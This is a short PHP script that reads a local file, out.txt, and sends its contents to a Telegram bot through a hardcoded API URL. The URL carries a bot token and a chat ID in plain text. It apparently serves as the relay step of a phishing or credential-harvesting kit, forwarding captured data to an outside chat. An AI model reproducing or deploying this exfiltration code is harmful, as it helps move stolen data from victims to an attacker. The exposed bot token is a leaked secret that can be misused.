<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot5162274948:AAHY24Pu1Qxq_wnWxgS1Q5BYaaswWVXLg6w/sendMessage?chat_id=1443797903&text=$msg");
?>